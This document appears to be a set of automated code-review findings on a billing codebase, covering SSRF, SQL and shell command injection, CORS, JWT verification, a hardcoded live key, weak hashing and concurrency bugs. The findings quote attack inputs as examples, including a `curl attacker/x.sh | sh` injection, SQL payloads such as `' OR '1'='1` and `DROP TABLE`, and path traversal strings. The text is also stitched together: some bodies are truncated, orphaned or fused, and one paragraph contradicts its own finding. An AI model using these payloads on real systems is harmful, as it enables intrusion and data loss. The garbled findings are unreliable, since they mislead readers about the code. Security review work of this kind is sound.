findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def`, so callers will `await` it and assume it yields control while the network call is in flight. But `requests.get` is a synchronous, blocking call: it holds the thread running the event loop until the response arrives or the 5s timeout expires. During that window no other coroutine progresses \u2014 including the `await client.get(...)` in `fetch_plan` directly above, other in-flight requests on the same worker, and any heartbeat/health tasks. Under concurrency this serialises the server at the latency of the billing service.

Note also that the function contains no `await` at all, which is the tell-tale sign: the `async` marker buys nothing here and actively misleads callers about the blocking behaviour.

Fix by using the async client already in use in this module, mirroring `fetch_plan`'s signature so the caller supplies the client:

```python
async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id):
    response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)
    return response.json()
```

If threading an `AsyncClient` through is not practical at the call site, the minimum acceptable stopgap is `await anyio.to_thread.run_sync(...)` / `loop.run_in_executor(...)` so the blocking call leaves the loop thread, and the `import requests` on line 2 can then be dropped entirely.

_Also raised by the docs agent:_ Async function performs blocking HTTP call

findings.title: Unescaped tenant_id interpolated into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `https://billing.internal/limits/{tenant_id}`. `requests` does not percent-encode path segments passed this way, so a `tenant_id` containing `../`, `?`, `#`, or a leading `//` can change which resource on the internal billing service is hit (e.g. `../../admin/keys` resolves away from `/limits/`), and a value beginning with `//` or containing a scheme can redirect the request entirely. Because `billing.internal` is an unauthenticated-looking internal host, this is a server-side request forgery primitive reachable from whatever supplies `tenant_id`.

Fix: validate `tenant_id` against the expected shape (e.g. UUID or `^[A-Za-z0-9_-]+$`) before use, or pass it through `urllib.parse.quote(str(tenant_id), safe="")`. Note the same unencoded interpolation exists on the pre-existing line 6, so a shared validation helper is probably the right shape.

A bare `except:` clause catches `BaseException`, not just `Exception`. That means a Ctrl-C arriving while `_client.send(payload)` is blocked on network I/O, or a `SystemExit` raised by `sys.exit()` during interpreter shutdown, will be caught and converted into a `None` return instead of propagating. The process will appear to ignore the interrupt, and a shutdown path that relies on `SystemExit` unwinding will continue as if nothing happened.

The evident intent is "make the metrics push non-fatal", which only concerns operational errors. Narrow the handler to `except Exception:` so control-flow exceptions still propagate.

findings.title: try_consume races on _counters: check-then-act across an await, no lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` into `current` (line 15), checks the limit (line 16), then yields to the event loop at `await asyncio.sleep(0)` (line 18) before writing back on line 19. Two consequences:

1. **Limit bypass.** Any number of coroutines can pass the `current + cost > LIMIT` check with the same stale `current` while suspended at line 18, and all of them will then commit. The effective total can exceed `LIMIT` by an unbounded amount.
2. **Lost updates.** Line 19 assigns an absolute value computed *before* the suspension point rather than incrementing. Any `consume()` call (line 10) or other `try_consume` that lands between lines 15 and 19 has its contribution silently overwritten, so the counter can go *down* — which makes the limit even easier to bypass.

The module already has `_lock` and `consume()` holds it for exactly this reason; `try_consume` should do the same, and should increment in place rather than writing a precomputed absolute:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` on line 18 is genuinely needed (e.g. it stands in for real I/O), it must be moved outside the critical section or the read must be re-done after it.

findings.title: Retry wraps non-idempotent charge, risking duplicate charges
findings.body:
`charge_card` decorates `billing.gateway.charge` with `@retry(attempts=3)`. `charge` POSTs to `/charges` and its docstring states it is NOT idempotent "each call creates a new charge". A retry only helps when the failure happened before the gateway processed the request; for a socket timeout, a 5xx after commit, or a dropped response, the charge has already been created and the retry creates a second (and possibly third) one, so a customer can be billed up to 3x for one intent.

The gateway already provides the correct mechanism: an `Idempotency-Key` header. Generate a key once per logical charge attempt (outside the retry loop, so all attempts share it), thread it through `charge(...)`, and only then is the retry safe. Until that key is plumbed through, this wrapper should not retry — either drop the decorator or restrict it to errors that are provably pre-dispatch (e.g. connection-refused / DNS), not timeouts or 5xx.

Note the contrast with `fetch_charge` on lines 5-7: `get_charge` is documented "Safe to repeat", so the retry there is correct. The same decorator is not transferable to the write path.

_Also raised by the security agent:_ Retry wraps non-idempotent charge without Idempotency-Key

findings.title: Size-limit clear discards the entry just written (and all others)
findings.body:
`get_tenant_fresh` stores `tenant` at line 10 and then, if the cache has crossed 1000 entries, calls `_CACHE.clear()` at line 12. On the call that trips the threshold the freshly-fetched entry is thrown away along with every other entry, so a subsequent `get_tenant(tenant_id)` returns `None` even though the caller just refreshed that tenant. It also means the cache periodically drops to empty, sending every subsequent reader to `_fetch` at once.

If a bound is needed, evict rather than flush — e.g. drop the oldest entry (`collections.OrderedDict` + `popitem(last=False)`, or `functools.lru_cache`/an LRU structure) so the entry just written survives and the cache degrades gradually instead of all at once.

findings.title: dashboardCors disables the origin allowlist (origin "*" + credentials)
findings.body:
`dashboardCors` replaces the `ALLOWED` origin allowlist used by the existing export (line 6) with a blanket `"*"` while keeping `credentials: true`. Entry point: the `Origin` request header sent by any page the victim visits; sink: the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers emitted by this middleware on every route it is mounted on.

Two separate problems:

1. The origin control is simply off. Any site on the internet can read responses from the dashboard routes for unauthenticated/token-less requests, including any data the endpoint returns to an anonymous caller and any internal detail in error bodies.
2. `credentials: true` alongside `"*"` is a contradiction. With the Express `cors` package a literal `*` is emitted, so browsers will *reject* credentialed cross-origin responses — meaning the dashboard's cookie-authenticated calls will silently break — and the natural "fix" someone reaches for is `origin: true` or reflecting the request origin, which turns this into a full cross-origin session-riding read of authenticated dashboard data.

Fix: reuse `ALLOWED` (or a dashboard-specific explicit list of origins) rather than `"*"`. If the dashboard endpoints genuinely need to be public, drop `credentials: true` and confirm those routes serve no session-scoped data. Do not reflect `req.headers.origin` unchecked.

I cannot see from this diff which routes mount `dashboardCors` or whether authentication on them is cookie-based, so the blast radius is unconfirmed; the removal of the allowlist itself is visible on line 11.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` makes the middleware emit the literal header `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. Per the Fetch spec, a user agent must fail any request whose credentials mode is `include` when the allow-origin header is `*`, so cookie/Authorization-bearing dashboard requests will be blocked by the browser and the `credentials: true` flag is effectively dead configuration — the opposite of the intent implied by setting it.

To actually allow credentialed cross-origin calls, echo the request origin from an allowlist (the pattern already used by the existing export on line 6, `origin: ALLOWED`) rather than `"*"`, e.g. add the dashboard origin(s) to `ALLOWED` and reuse it, or pass a function/array of permitted origins so the middleware reflects a concrete origin value and sets `Vary: Origin`.

A caller who copies this pattern for a new endpoint would unknowingly create broken CORS rules.

findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`. In PyJWT, turning off signature verification also turns off the dependent claim checks (`exp`, `nbf`, `aud`, `iss`) by default, so this function will happily parse a forged or long-expired token and hand back whatever `tenant_id` the caller's token payload contains. Any caller that uses the result to scope a query or a permission check is scoping it to a value the client chose.

The sibling function two lines above (`claims_for`) already verifies with `public_key()` and `algorithms=["RS256"]`. `tenant_of` should be implemented on top of it, e.g. `return claims_for(token)["tenant_id"]`, so both functions return claims with the same trust level. If the motivation was avoiding the key lookup, cache `public_key()` rather than skipping verification.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})` and returns `unverified["tenant_id"]`. Anyone who can present a token to whatever handler calls this can craft one locally (any header/payload, garbage signature) and set `tenant_id` to another tenant's identifier. If this value is used for data scoping — the name strongly suggests it is — that is cross-tenant read/write with no key material required.

The sibling function on line 7 already does the verified decode against `public_key()`. Use it: `claims_for(token)["tenant_id"]`. If the motivation was avoiding a key lookup, cache `public_key()` rather than skipping verification. Note also that unverified decode skips `exp`/`aud` checks, so revoked and expired tokens pass too.

If there is a genuine need to peek at a claim before the key is known (e.g. to select a signing key by issuer), the value must be treated as untrusted and re-checked against the verified claims afterwards, and the function should be named to say so.

Without this documented contract, callers could misuse the function—for example, trusting an unverified tenant_id in an authorization check, or calling it on untrusted token data without understanding the security implications.

findings.body:

findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` builds its query by string interpolation: `f"... name LIKE '%{term}%' AND status = '{status}'"` and then calls `execute(sql)` with no params. Both `term` and `status` are inlined into the statement inside single quotes, so any value containing `'` breaks out of the literal and appends arbitrary SQL (e.g. `status = "x' OR '1'='1"` returns the whole customers table; `term = "'; DROP TABLE customers; --"` or a `UNION SELECT` reaches the interpreter directly). `billing/db.py:execute(sql, params=None)` explicitly documents that `params` must carry every caller value, and `get_customer` on line 5 already does this correctly with `%s` placeholders.

Fix by parameterising both values and letting the driver quote them, e.g.:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If `status` is drawn from a fixed set, additionally validate it against an allowlist.

findings.title: search_customers interpolates values instead of passing params to execute()
findings.body:
`billing.db.execute` documents that `params` "must carry every caller value", and the sibling function `get_customer` on line 5 follows that by passing `(customer_id,)`. Line 9 instead embeds `term` and `status` directly into the SQL text and line 10 calls `execute(sql)` with `params` omitted, so no value ever reaches the driver for quoting.

Beyond the obvious injection exposure, this is plainly incorrect for reachable, benign inputs:
- `term = "O'Brien"` closes the single quote and yields a syntactically invalid statement, so a legitimate name search raises instead of returning rows.
- `term` containing `%` or `_` is spliced into the LIKE pattern unescaped and silently matches far more rows than requested.

Fix by parameterising both values and building the wildcard pattern in Python, e.g.:

    return execute(
        "SELECT * FROM customers WHERE name LIKE %s AND status = %s",
        (f"%{term}%", status),
    )

(If literal `%`/`_` inside `term` should match themselves, escape them before wrapping and add the matching `ESCAPE` clause.)

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the sibling function enforces
findings.body:
The function immediately above validates the destination host against `ALLOWED_HOSTS` and raises `ValueError` before issuing a request (lines 8-9). `verify_endpoint` takes the same kind of caller-supplied `url` and issues a server-side GET with no host parse, no scheme check, and no allowlist consultation. Any caller that can reach this function can make the server fetch internal addresses (link-local metadata endpoints, localhost admin ports, internal service hostnames) and learn the status code, which is enough to enumerate internal services.

Extract the parse-and-allowlist step used by the send path into a shared helper and call it here before `requests.get`. Also pass `allow_redirects=False`, otherwise an allowlisted host can 302 the request to an internal target and the check is defeated anyway.

findings.title: Customer invoices bucket has all public access blocks disabled
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false`. This is the account/bucket-level guardrail that prevents a public ACL or bucket policy from ever taking effect; with it off, any principal able to write an ACL or bucket policy (or any future Terraform change, console click, or SDK call) can expose `acme-customer-invoices` to anonymous readers, and S3 will not stop it. The bucket name is also guessable, so an attacker does not need to discover it — enumeration of `acme-*` names is enough to test for anonymous `GetObject`/`ListBucket`.

The assets bucket above is deliberately public; the invoices bucket appears to have been created by copying that block. For a bucket holding customer invoices the settings should be inverted:

```hcl
resource "aws_s3_bucket_public_access_block" "invoices" {
  bucket                  = aws_s3_bucket.invoices.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

Simply omitting the resource is not equivalent — S3's bucket-level defaults depend on account settings and creation path, so set all four to `true` explicitly.

findings.title: Invoices bucket disables all public access blocks (copy-paste from assets)
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` — an exact copy of the block for the deliberately-public `assets` bucket. A bucket named `acme-customer-invoices` is plainly not intended to be publicly reachable; with all four guards off, any ACL or bucket policy that grants `*` (including one added later, or by a different module) takes effect immediately and exposes customer invoices.

Either set all four flags to `true`, or simply omit the `aws_s3_bucket_public_access_block` resource for this bucket and rely on the account-level block. If some narrower exposure is genuinely required, flip only the specific flag needed and document why.

However, the PR description states the invoices bucket is "not meant to be" public. The Terraform code contains no comment or documentation explaining why this bucket is intentionally public or whether this is a configuration error. A caller or maintainer reading only the code would not understand that public access is intentional versus accidental.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex HMAC as `verify_stripe` but returns `expected == header`. String `==` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the expected digest the attacker guessed correctly. Since the attacker controls `header` and can replay the same body repeatedly, this permits byte-by-byte recovery of a valid signature for a forged payload — exactly the attack `hmac.compare_digest` on line 7 exists to prevent. Replace with `return hmac.compare_digest(expected, header)` to match the sibling function.

Note also the behavioural divergence this creates: `compare_digest` raises `TypeError` on a `None`/non-ASCII-str `header`, while `==` silently returns `False`, so the two providers will not fail the same way on a malformed request header.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: New verify_acmepay function has no test coverage

Without a test exercising this function (e.g. asserting correct/incorrect signatures behave as expected, or specifically checking timing-safety), any future change to fix or further weaken this comparison would go unnoticed.

findings.title: Reset password hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password value with a single unsalted `hashlib.md5`. MD5 is fast (billions of guesses/sec on commodity GPUs) and unsalted, so the output is directly attackable with rainbow tables and offline brute force if the datastore leaks — the exact threat bcrypt on line 7 exists to defend against. Any credential set through the reset flow is therefore far weaker than one set through `hash_password`.

Fix: call the existing `hash_password` (bcrypt) from the reset path so there is one storage format. If this value is meant to be a one-time reset *token* rather than a password, generate it with `secrets.token_urlsafe`, store `hashlib.sha256` of it (or bcrypt), give it an expiry, and compare with `hmac.compare_digest` — but the parameter name `raw` and the module context indicate it is a password.

findings.title: Reset hash returns MD5 hex, incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which callers almost certainly verify with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-character MD5 hex digest. If both values land in the same stored credential field, verification will diverge: `bcrypt.checkpw` against an MD5 hex digest either raises `ValueError` on an invalid salt or returns False, so a user who completes a password reset can be locked out — or, worse, a caller catches that error and falls back to a weaker comparison. If a separate verification path exists for reset hashes, the two formats are indistinguishable without an explicit algorithm tag in storage. Produce the reset hash with `hash_password` (bcrypt) so a single verification routine remains correct.

If hash_reset_password's implementation were changed (e.g., to a different, broken hashing scheme) or if checksum's file-reading logic were wrong, nothing would fail. Since this is a password-reset code path, add at least a basic test asserting the function's output format/determinism, and a test for checksum against a known file's expected digest.

findings.title: csv_rows joins values without csv_escape, emitting malformed CSV
findings.body: `csv_rows` renders each field with `str(r.get(c, ""))` and joins with `","`, bypassing the `csv_escape` helper added three lines below it. A row value such as `"Smith, John"` or one containing a `"` character produces a line with more fields than there are columns, and any consumer parsing it back gets shifted data. Wrap the field in `csv_escape(...)` inside the comprehension (e.g. `csv_escape(str(r.get(c, "")))`) so the two functions agree on the output format, and add a case covering a comma-bearing value.

findings.title: csv_rows bypasses csv_escape, allowing CSV structure injection
findings.body:
`csv_rows` interpolates each field with `",".join(str(...))` and never calls the `csv_escape` helper defined four lines below it. Any field value containing a comma, a double quote, `\r` or `\n` will split into extra columns or extra rows in the generated report, so whoever controls a single record field controls the shape of the whole export (and, for a consumer that re-parses it, its contents).

Two concrete fixes:
- Route every field through the escaper: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.
- Extend `csv_escape` to also quote values containing `\n` or `\r`; RFC 4180 requires quoting for those too, and they are the ones that forge new rows rather than just new columns.

Better still, use the stdlib `csv` module, which handles quoting, embedded newlines and dialects correctly. Separately, if these files are opened in a spreadsheet, consider prefixing values that begin with `=`, `+`, `-` or `@` to avoid formula injection.

I cannot see the caller that supplies `rows`, so I cannot confirm the field values are attacker-influenced; confidence is lowered accordingly. If `rows` ever carries user-supplied strings, this is exploitable as written.

findings.body:
`issue_token()` reads the clock to set `issued_at`, and line 11 reads it again via `datetime.now(timezone.utc)`. findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but contains no `await`; the HTTP call is made with the synchronous `requests` library. When awaited from an event loop, `requests.get` blocks the whole loop until the response arrives or the 5s timeout fires, stalling every other concurrently-served request — the exact opposite of what the surrounding async code (line 6, `await client.get(...)`) achieves.

Fix by using the same async client style as `fetch_plan`, e.g. accept an `httpx.AsyncClient` (or create one in an `async with`) and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If the synchronous dependency must stay, wrap it in `asyncio.to_thread(...)`/`run_in_executor` so it does not occupy the loop thread. As a side benefit, using the passed-in client also reuses the connection pool instead of opening a fresh connection per call.

findings.title: tenant_id interpolated into internal URL without encoding
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `https://billing.internal/limits/{tenant_id}`. `tenant_id` is not validated or percent-encoded before it becomes part of the path. If it reaches this function from a request parameter, a value such as `../../admin/keys` or `x?foo=` lets the caller steer the request at other paths (and query strings) on the internal billing host, which is typically reachable only from the service and may not enforce its own authorization. `requests` also follows redirects by default, so a manipulated path that lands on a redirecting endpoint can pull the client to a further destination.

Fix by constraining the value before it is used \u2014 e.g. reject anything that is not the expected tenant id shape (UUID/integer), or at minimum `urllib.parse.quote(str(tenant_id), safe="")` \u2014 and consider `allow_redirects=False` for an internal API call. The same interpolation exists on line 6 for the httpx path; the same validation should apply there.

The process then continues running as if nothing happened, defeating shutdown and interrupt handling. findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, yields the event loop at line 18 (`await asyncio.sleep(0)`), then writes an absolute value at line 19 — all outside `_lock`, which every other access to `_counters` holds (line 9).

Two concrete failures:

1. **Limit bypass.** Two coroutines for the same tenant can both read `current` before either writes. Both see `current + cost <= LIMIT` and both commit, so the counter can end up at `current + 2*cost`, arbitrarily above `LIMIT` with N concurrent callers.
2. **Lost updates.** Line 19 assigns `current + cost` rather than incrementing the current value. Any `consume()` that completes during the `await` at line 18 has its increment silently discarded, because `current` is a stale snapshot taken at line 15.

Fix by holding the lock for the whole read-check-write and by re-reading inside the critical section, e.g.:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` at line 18 represents real work (not just a yield), that work must be moved outside the critical section and the counter re-validated after it.

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act across await in try_consume

findings.title: Off-by-one in page_of_sorted drops one record per page
findings.body:
`start` advances by `PAGE_SIZE` per page (line 11), but the slice end is `start + PAGE_SIZE - 1`, so each page yields at most `PAGE_SIZE - 1` items and the record at index `start + PAGE_SIZE - 1` is never returned by any page — it falls into the gap between page N's end and page N+1's start. Iterating all pages therefore silently loses one record for every page, which for an export endpoint means missing data rather than a visible error.

The sibling helper `page_of` on line 6 uses `records[start : start + PAGE_SIZE]`, confirming the intended contract. Change line 12 to `return ordered[start : start + PAGE_SIZE]`.

Also note the degenerate case: if `PAGE_SIZE` is ever 1, the slice is `[start:start]` and every page comes back empty, which will hang any caller that pages until it gets a short/empty result.

findings.title: File handle leaks on header-mismatch and exception paths
findings.body:
`fh = open(path)` is only closed on the success path (line 16). When the header does not match `expected_header`, line 14 returns `None` with the handle still open, and any exception raised by `next(reader)` or `list(reader)` (decode errors, malformed CSV, `StopIteration`) escapes the same way. Under CPython the handle is reclaimed non-deterministically by refcounting, and on PyPy or when the object is captured in a traceback it can stay open indefinitely — repeated failed imports will exhaust file descriptors.

Use the same `with open(path) as fh:` pattern already used by `read_rows` on line 5 and return from inside the block, which closes the handle on every path.

findings.title: Retry wraps non-idempotent charge; can double-bill customers
findings.body:
`billing.gateway.charge` is explicitly documented as NOT idempotent — "each call creates a new charge" — and the retry decorator will re-invoke it on any failure. The dangerous case is a failure that happens *after* the gateway accepted the charge (read timeout, connection reset on response, 5xx emitted post-commit): the charge exists, the retry fires, and with `attempts=3` the customer can be billed up to three times for one intent.

The gateway already provides the fix: it accepts an `Idempotency-Key` header. Generate one key per logical charge attempt *outside* the retried function and pass it through, so all three attempts collapse to a single charge server-side. For example, have `charge_card` accept (or generate) an `idempotency_key` before the decorated call is entered and forward it to `charge(...)`, and only then is the retry safe. Alternatively, drop the retry here and let the caller reconcile via `fetch_charge`.

Note the contrast with `fetch_charge` on lines 5–7, which is correctly retried because `get_charge` is documented "Safe to repeat" — the same decorator is sound there and unsound here.

findings.title: Retry decorator on non-idempotent charge operation lacks safety contract
findings.body: The new `charge_card` function wraps `charge()` with a retry decorator, but `charge()` is explicitly documented as NOT idempotent — each call creates a new charge. The wrapper function's docstring or comment must document that retries are only safe if an Idempotency-Key is passed to the gateway, as stated in the underlying `charge()` docstring. Without this documentation, callers may assume retries are safe when they are not, risking duplicate charges.

findings.title: New charge_card retry wrapper has no test exercising retry behavior
findings.body: charge_card wraps billing.gateway.charge, which the gateway docstring explicitly states is NOT idempotent (each call creates a new charge), with @retry(attempts=3). No test in this diff verifies what happens when the underlying charge call fails after partially succeeding or when retry triggers a second call — nothing would fail today if this wrapper caused duplicate charges on retry. Given the existing fetch_charge test pattern presumably exercises retry-on-failure for the idempotent get_charge, an equivalent test for charge_card would surface that retrying a non-idempotent call is unsafe (e.g. by asserting the gateway is invoked more than once and money isn't charged twice), but none exists.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError

In CPython, subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every input rather than for an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. (`timezone` is clearly already imported, since line 5 uses it.)

While fixing this, also consider whether an already-expired invite should count: `delta.total_seconds()` goes negative once `expires_at` is in the past, so the function will report True for invites that expired long ago. If the caller wants "expiring soon but not yet expired", the condition needs a lower bound as well.

findings.title: Cache clear discards the entry just written and all other tenants
findings.body:
`get_tenant_fresh` inserts `tenant` at line 10 and then, whenever the cache has grown past 1000 entries, calls `_CACHE.clear()` at line 12. The clear runs *after* the insert, so on the call that crosses the threshold the value just fetched is removed again: an immediately following `get_tenant(tenant_id)` returns `None` even though a fresh fetch just succeeded. The same clear also evicts up to 1000 unrelated tenants in one step, so every reader misses at once and stampedes `_fetch`.

If a bound is wanted, evict a single entry (or use an LRU such as `functools.lru_cache`/`OrderedDict.popitem(last=False)`) and check the size *before* inserting, so the freshly fetched value survives.

If the eviction threshold logic were wrong (e.g. off-by-one, wrong comparison, or clearing on every call), or if the write to _CACHE used the wrong key/value, nothing would fail. This violates the established naming contract: the existing `get_tenant` (line 4-5) reads without mutation, so a caller would reasonably expect `get_tenant_fresh` to do the same. findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell string on line 9 and executes it with `shell=True` on line 10. Neither value is quoted, escaped, or validated. A value such as `name = "x; curl attacker/x.sh | sh"` or `directory = "$(id)"` is interpreted by `/bin/sh`, so whoever supplies these arguments gets arbitrary command execution as the service user.

Fix by dropping the shell and passing an argument vector, as the existing `list_exports` on line 5 already does:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Also constrain `name` to a safe character set (e.g. `[A-Za-z0-9_-]+`) and resolve the joined output path before use — even without a shell, a `name` containing `../` writes the archive outside `/exports/`, and a `directory` beginning with `-` is consumed by `tar` as an option.

findings.title: Unquoted interpolation into shell=True breaks on spaces and metacharacters
findings.body: `cmd` is assembled with an f-string and executed via `shell=True`, so both `name` and `directory` are subject to shell word-splitting, glob expansion and metacharacter interpretation. A directory like `/data/my exports` becomes two arguments and tar archives the wrong paths; a `name` containing `*`, `;`, `&&` or `$(...)` changes the command that runs entirely. Build the argument list instead and drop the shell: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)` — matching the list form already used by `list_exports` on line 5. Also consider validating `name` against path separators, since `name="../etc/x"` writes outside `/exports`.

There is no test in this diff verifying its behavior (e.g., correct archive path, handling of special characters in name/directory, or that it raises on failure). Since the existing list_exports function also appears untested in the visible code, this isn't a departure from repo standard, but the new function introduces command construction logic (string formatting into a shell command) that is exactly the kind of code a unit test (with a mocked subprocess.run) would catch regressions or malformed-input issues in.

findings.body: The `create_archive` function is a public API (it follows the naming convention and sits alongside the public `list_exports`). A caller cannot determine from the signature alone what `name` and `directory` parameters should be, what constraints they have, or what the return value is. This is particularly risky because the function accepts user-supplied input that flows into a shell command, and the contract should explicitly document any sanitization requirements or guarantees.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, which removes the origin allowlist that the adjacent middleware applies (`origin: ALLOWED, credentials: true`, lines 6-7). Any route mounted with this middleware accepts cross-origin requests from every site, and the handler is configured to participate in credentialed (cookie / `Authorization`) exchanges, so any authenticated dashboard endpoint becomes readable cross-site by an arbitrary attacker page the victim visits.

Note the interaction with the `cors` package: with a literal `"*"` it emits `Access-Control-Allow-Origin: *`, and browsers refuse to expose such a response to a credentialed request — so the immediate read may fail in a compliant browser. That is an accident of the library's serialisation, not an intentional control: the configuration states the intent to allow credentials from any origin, `Access-Control-Allow-Credentials: true` is still emitted, and a later change to `origin: true` / origin reflection (the usual "fix" when someone notices the requests failing) turns this into a full cross-site read of authenticated dashboard data with no further edits.

Replace the wildcard with an explicit allowlist (reuse `ALLOWED`, or a dashboard-specific list), or, if the dashboard endpoints are genuinely public and unauthenticated, set `credentials: false` so the intent is unambiguous.

findings.title: origin "*" with credentials: true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` makes the middleware emit the literal header `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. The Fetch/CORS spec forbids the wildcard when the request is made in credentials mode (`credentials: "include"` / `withCredentials = true`): the browser fails the check and the response is never exposed to the dashboard, even though the server returned 200. So `credentials: true` here is dead configuration and any credentialed dashboard request will break at runtime rather than being allowed.

If the dashboard genuinely needs cookies/Authorization on cross-origin calls, the origin must be reflected explicitly — e.g. pass a function or an allow-list (as the existing `ALLOWED` config on line 6 does) so a concrete origin value is echoed back. If the dashboard does not need credentials, drop `credentials: true` and the wildcard becomes coherent. Either way the current pair cannot be what was intended.

findings.title: New wildcard+credentials CORS config has no test coverage
findings.body: dashboardCors combines origin: "*" with credentials: true, a combination browsers reject and that is a known misconfiguration pattern. No test verifies the behavior of this exported config (e.g., that requests are rejected or that the config is invalid). If this were fixed or regressed, nothing in the diff would catch it.

findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal with an `acme_live_` prefix, and the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup was deleted (the `import os` line was removed too). Anyone with read access to the repository — or to any clone, CI log, container image or fork — now holds a production payment credential, and it is permanently in git history even if the line is reverted.

Restore the environment lookup (or a secrets manager call), and treat the committed value as compromised: rotate/revoke the key at AcmePay now, then purge it from history. Consider adding a pre-commit secret scanner so a `*_live_*` literal cannot land again.

findings.title: Env-based key removed: every environment now uses the same live key
findings.body: `client()` previously read the key from `os.environ["ACMEPAY_SECRET_KEY"]`, so each environment (dev, CI, staging, prod) supplied its own credential and a missing value raised `KeyError` immediately at call time. After this change the key is a module-level constant whose value is prefixed `acme_live_`, so there is no longer any way to point a non-production deployment or a CI run at a test/sandbox key — every caller of `client()` will transact against the live payments account, and the fail-fast on misconfiguration is gone. findings.title: fake_client() return shape does not match client()

findings.title: tenant_id read from a JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})` and returns `unverified["tenant_id"]` directly. A JWT is by definition attacker-supplied data (it arrives on the request from the client), and with verification off the library performs no integrity check at all — anyone can mint a token with an arbitrary header/payload and no valid signature and have this function return whatever `tenant_id` they choose. If any caller uses this value to scope queries, pick a database/schema, or authorise a tenant-level operation, that is a direct cross-tenant data access.

The justification in the PR description ("to avoid a key lookup") does not hold: the tenant cannot be trusted before the signature is checked, and the module already has a verifying path one line above — `claims_for()` uses `public_key()` with `algorithms=["RS256"]`. Implement this as `return claims_for(token)["tenant_id"]` (with a guard for a missing claim). If the key lookup genuinely needs the tenant to select a key, the unverified read must be treated as a *hint only* and the token must still be verified against the key it names before any claim is used for authorisation.

_Also raised by the correctness agent:_ tenant_of returns an unauthenticated tenant id from an unverified token

findings.title: No test coverage for unverified tenant extraction
findings.body: tenant_of() decodes a JWT with verify_signature disabled and trusts the tenant_id claim. There is no test in this diff exercising this function, e.g. verifying that a forged/tampered token with an arbitrary tenant_id is still accepted, or that this behaves differently from claims_for(). If this logic is later 'fixed' to still skip verification incorrectly, or if a regression reintroduces verification in a way that breaks callers, nothing here would fail.

findings.title: Missing tenant_id claim escapes as a bare KeyError
findings.body: With verification disabled there is nothing that guarantees the payload contains `tenant_id`, so a token without that claim makes line 12 raise `KeyError('tenant_id')`. Callers wrapping auth failures will be catching JWT/auth exceptions, not `KeyError`, so this is likely to surface as a 500 rather than a rejected token. Use `.get("tenant_id")` with an explicit check and raise the module's auth error, or validate the claim's presence explicitly.

findings.title: Public function `tenant_of` lacks documentation of signature verification bypass

A caller reading only the function name and signature would not know that the token is being decoded without verification, which is a critical behavioural detail. Document the verification status and when this function should be used versus `claims_for`.

findings.title: Missing ownership check lets any user edit another's payment method
findings.body:
`update_payment_method` resolves `pm_id` (attacker-controlled path/query parameter) straight into `PaymentMethod.get(pm_id)` on line 12 and then writes `body["billing_name"]` and persists it on lines 13-14, with no authorisation check. The `user` obtained on line 11 is never used — authentication alone is established, authorisation is not.

The read handler immediately above does this correctly: line 6 calls `require_owner(current_user(request), pm)` before returning data. `api/auth.py` documents that `require_owner` must be called on *every* object mutation.

Fix: insert `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` call and before any attribute assignment, so the Forbidden is raised before `pm.save()`.

